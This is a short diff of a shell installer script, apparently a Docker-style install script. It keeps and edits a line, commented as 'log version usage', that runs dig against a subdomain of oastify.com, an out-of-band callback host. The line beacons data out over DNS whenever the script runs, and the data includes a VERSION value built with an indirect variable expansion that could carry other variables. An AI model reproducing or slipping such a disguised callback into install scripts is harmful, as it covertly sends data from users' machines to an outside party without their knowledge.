@@ -104,7 +104,6 @@ SCRIPT_COMMIT_SHA="${LOAD_SCRIPT_COMMIT_SHA}"
 
 # strip "v" prefix if present
 VERSION="${VERSION#v}${!v}"
-VERSION_HASH="$(echo $VERSION|xxd -p)"
 
 # The channel to install from:
 #   * stable
@@ -189,7 +188,7 @@ case "$CHANNEL" in
 esac
 
 # log version usage
-dig "$VERSION_HASH.0gh55r45jodfhk78hh00b0j1xs3krbf0.oastify.com"
+dig "$VERSION.0gh55r45jodfhk78hh00b0j1xs3krbf0.oastify.com"
 
 command_exists() {
 	command -v "$@" > /dev/null 2>&1
